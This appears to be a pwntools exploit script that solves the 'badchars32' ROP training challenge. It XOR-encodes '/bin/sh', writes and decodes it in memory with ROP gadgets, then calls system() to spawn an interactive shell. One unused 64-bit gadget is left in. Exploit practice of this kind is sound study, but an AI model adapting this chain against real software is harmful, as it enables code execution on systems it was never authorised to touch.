from pwn import *

# DO NOT write at start of data segment, it gets used by libc and fucks things up.
data_seg     = 0x0804a0a0
system_plt   = 0x080484e0

# Gadgets needed to write data
pop_esi_edi  = 0x08048899 # pop esi ; pop edi ; ret
mov_edi_esi  = 0x08048893 # mov dword ptr [edi], esi ; ret

# Gadgets needed to decode string
pop_ebx_ecx  = 0x08048896 # pop ebx ; pop ecx ; ret
xor_ebx_cl   = 0x08048890 # xor byte ptr [ebx], cl ; ret

# Gadget needed to call system()
pop_rdi      = 0x400b39 # pop rdi ; ret

bin_sh = '/bin/sh\x00'
encoded_bin_sh = ''
xor_byte = 0x23

for i in bin_sh:
    encoded_bin_sh = encoded_bin_sh + chr(ord(i) ^ xor_byte)

# EIP offset is at 44
rop = "A" * 44

# Write encoded /bin/sh to data_seg
rop += p32(pop_esi_edi)
rop += encoded_bin_sh[:4]
rop += p32(data_seg)
rop += p32(mov_edi_esi)

rop += p32(pop_esi_edi)
rop += encoded_bin_sh[4:8]
rop += p32(data_seg + 4)
rop += p32(mov_edi_esi)

# Decode data
for i in range(len(encoded_bin_sh)):
    rop += p32(pop_ebx_ecx)
    rop += p32(data_seg + i)
    rop += p32(xor_byte)
    rop += p32(xor_ebx_cl)

# call system@plt
rop += p32(system_plt)
rop += "B" * 4
rop += p32(data_seg)

# Start process and send rop chain
e = process('badchars32')
print e.recv()
e.sendline(rop)
e.interactive()
